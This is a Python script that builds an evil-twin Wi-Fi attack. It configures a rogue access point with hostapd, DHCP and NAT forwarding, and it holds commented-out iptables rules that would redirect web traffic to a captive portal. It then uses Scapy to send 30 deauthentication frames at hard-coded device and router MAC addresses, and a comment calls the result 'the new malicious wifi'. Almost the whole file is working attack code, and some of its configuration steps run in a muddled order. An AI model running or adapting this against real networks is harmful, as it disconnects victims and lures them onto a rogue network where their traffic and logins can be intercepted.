from scapy.all import *
import os
import subprocess
import time
import sys

def set_adapter_to_monitor(iface_wifi):
    os.system(f"sudo ifconfig {iface_wifi} down")
    os.system(f"sudo iwconfig {iface_wifi} mode monitor")
    os.system(f"sudo ifconfig {iface_wifi} up")

def set_default_gateway(iface_wifi, gateway_ip):
    os.system(f"sudo route add default gw {gateway_ip} {iface_wifi}")
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True, text=True)


def start_ap(iface_wifi, iface_router, gateway_ip, portal_address):
    # Stop any existing DHCP servers
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])

    # Create a new DHCP server configuration file
    with open('/etc/dhcp/dhcpd.conf', 'w') as f:
        f.write('subnet 192.168.42.0 netmask 255.255.255.0 {\n')
        f.write('    range 192.168.42.10 192.168.42.50;\n')
        f.write('    option broadcast-address 192.168.42.255;\n')
        f.write('    option routers 192.168.42.1;\n')
        f.write('    default-lease-time 600;\n')
        f.write('    max-lease-time 7200;\n')
        f.write('    option domain-name "local";\n')
        f.write('    option domain-name-servers 8.8.8.8, 8.8.4.4;\n')
        f.write('}\n')

    # Configure the access point
    subprocess.call(['sudo', 'ifconfig', iface_wifi, '192.168.42.1'])
    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf'])
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'start'])

    # Set the default gateway to be the router's IP address
    set_default_gateway(iface_wifi, gateway_ip)

    # Enable IP forwarding on the router interface
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True, text=True)
    subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', iface_router, '-j', 'MASQUERADE'])

    # # Redirect clients to the captive portal page
    # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', portal_address])
    #
    # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', portal_address])

    # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'DNAT',
    #                  '--to-destination', portal_address])

    # Wait for the access point to start
    time.sleep(5)

def stop_ap(iface_wifi, iface_router):
    # Disable IP forwarding on the router interface
    subprocess.call(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', iface_router, '-j', 'MASQUERADE'])
    subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True, text=True)

    # Stop the access point
    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])
    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf', '-i', iface_wifi, '-K'])
    subprocess.call(['sudo', 'ifconfig', iface_wifi, 'down'])

def create_ap_config(ssid, iface_wifi, wifi_channel):
    config_file = f"""interface={iface_wifi}
ssid={ssid}
driver=nl80211
channel={wifi_channel}"""
    with open("/etc/hostapd/hostapd.conf", "w") as f:
        f.write(config_file)


interface = "wlxc83a35c2e0a2"
ssid = "eylon&michael"
wifi_channel = 11

# Check that at least one argument was passed
if len(sys.argv) > 2:
    # Get the first argument and store it in a variable
    ssid = sys.argv[1]
    wifi_channel = sys.argv[2]

ssid += "8"

ssid = "naamat"

gateway_ip = "192.168.1.1"  # IP address of the router
iface_router = "wlp0s20f3"
portal_address = "10.100.102.122:5000"

set_adapter_to_monitor(interface)
start_ap(interface, iface_router, gateway_ip, portal_address)
create_ap_config(ssid, interface, wifi_channel)

time.sleep(10)
channel = 11
set_adapter_to_monitor(interface)
# os.system("iwconfig %s channel %d" % (interface, channel))
deauth = RadioTap() / Dot11(addr1="28:cd:c4:9b:87:f5", addr2="5c:b1:3e:ce:bd:35", addr3="5c:b1:3e:ce:bd:35") / Dot11Deauth()
# Send the frame

# loop until the user enters to the new malicious wifi

sendp(deauth, iface=interface, count=30)